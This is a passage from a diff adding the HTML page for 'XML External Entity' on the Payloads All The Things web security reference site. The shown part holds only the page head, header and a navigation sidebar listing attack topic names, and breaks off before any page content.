@@ -1,0 +1,5344 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Payloads All The Things, a list of useful payloads and bypasses for Web Application Security">
+      
+      
+      
+      
+        <link rel="prev" href="../XSS%20Injection/XSS%20with%20Relative%20Path%20Overwrite/">
+      
+      
+        <link rel="next" href="../_LEARNING_AND_SOCIALS/BOOKS/">
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.5.0, mkdocs-material-9.1.19">
+    
+    
+      
+        <title>XML External Entity - Payloads All The Things</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.eebd395e.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.ecc896b0.min.css">
+      
+      
+
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../custom.css">
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#xml-external-entity" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="Payloads All The Things" class="md-header__button md-logo" aria-label="Payloads All The Things" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Payloads All The Things
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              XML External Entity
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+          
+            
+            
+            
+            <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+            
+              <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
+              </label>
+            
+          
+            
+            
+            
+            <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
+            
+              <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
+              </label>
+            
+          
+        </form>
+      
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.4.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="Payloads All The Things" class="md-nav__button md-logo" aria-label="Payloads All The Things" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    Payloads All The Things
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.4.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        Payloads All The Things
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CONTRIBUTING/" class="md-nav__link">
+        CONTRIBUTING
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+          API Key Leaks
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          API Key Leaks
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../API%20Key%20Leaks/" class="md-nav__link">
+        API Key Leaks
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+          AWS Amazon Bucket S3
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          AWS Amazon Bucket S3
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../AWS%20Amazon%20Bucket%20S3/" class="md-nav__link">
+        Amazon Bucket S3 AWS
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+          Account Takeover
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_5">
+          <span class="md-nav__icon md-icon"></span>
+          Account Takeover
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Account%20Takeover/" class="md-nav__link">
+        Account Takeover
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+          Argument Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_6">
+          <span class="md-nav__icon md-icon"></span>
+          Argument Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Argument%20Injection/" class="md-nav__link">
+        Argument Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+          Business Logic Errors
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_7">
+          <span class="md-nav__icon md-icon"></span>
+          Business Logic Errors
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Business%20Logic%20Errors/" class="md-nav__link">
+        Business Logic Errors
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
+          CICD
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_8">
+          <span class="md-nav__icon md-icon"></span>
+          CICD
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CICD/" class="md-nav__link">
+        CI/CD attacks
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
+          CORS Misconfiguration
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_9">
+          <span class="md-nav__icon md-icon"></span>
+          CORS Misconfiguration
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CORS%20Misconfiguration/" class="md-nav__link">
+        CORS Misconfiguration
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
+          CRLF Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_10">
+          <span class="md-nav__icon md-icon"></span>
+          CRLF Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CRLF%20Injection/" class="md-nav__link">
+        Carriage Return Line Feed
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="0">
+          CSRF Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_11">
+          <span class="md-nav__icon md-icon"></span>
+          CSRF Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CSRF%20Injection/" class="md-nav__link">
+        Cross-Site Request Forgery
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_12" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_12" id="__nav_12_label" tabindex="0">
+          CSV Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_12_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_12">
+          <span class="md-nav__icon md-icon"></span>
+          CSV Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CSV%20Injection/" class="md-nav__link">
+        CSV Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_13" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_13" id="__nav_13_label" tabindex="0">
+          CVE Exploits
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_13_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_13">
+          <span class="md-nav__icon md-icon"></span>
+          CVE Exploits
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CVE%20Exploits/" class="md-nav__link">
+        Common Vulnerabilities and Exposures
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CVE%20Exploits/Log4Shell/" class="md-nav__link">
+        CVE-2021-44228 Log4Shell
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_14" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_14" id="__nav_14_label" tabindex="0">
+          Command Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_14_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_14">
+          <span class="md-nav__icon md-icon"></span>
+          Command Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Command%20Injection/" class="md-nav__link">
+        Command Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_15" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_15" id="__nav_15_label" tabindex="0">
+          DNS Rebinding
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_15_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_15">
+          <span class="md-nav__icon md-icon"></span>
+          DNS Rebinding
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../DNS%20Rebinding/" class="md-nav__link">
+        DNS Rebinding
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_16" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_16" id="__nav_16_label" tabindex="0">
+          Dependency Confusion
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_16_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_16">
+          <span class="md-nav__icon md-icon"></span>
+          Dependency Confusion
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Dependency%20Confusion/" class="md-nav__link">
+        Dependency Confusion
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_17" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_17" id="__nav_17_label" tabindex="0">
+          Directory Traversal
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_17_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_17">
+          <span class="md-nav__icon md-icon"></span>
+          Directory Traversal
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Directory%20Traversal/" class="md-nav__link">
+        Directory Traversal
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_18" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_18" id="__nav_18_label" tabindex="0">
+          Dom Clobbering
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_18_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_18">
+          <span class="md-nav__icon md-icon"></span>
+          Dom Clobbering
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Dom%20Clobbering/" class="md-nav__link">
+        Dom Clobbering
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_19" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_19" id="__nav_19_label" tabindex="0">
+          File Inclusion
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_19_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_19">
+          <span class="md-nav__icon md-icon"></span>
+          File Inclusion
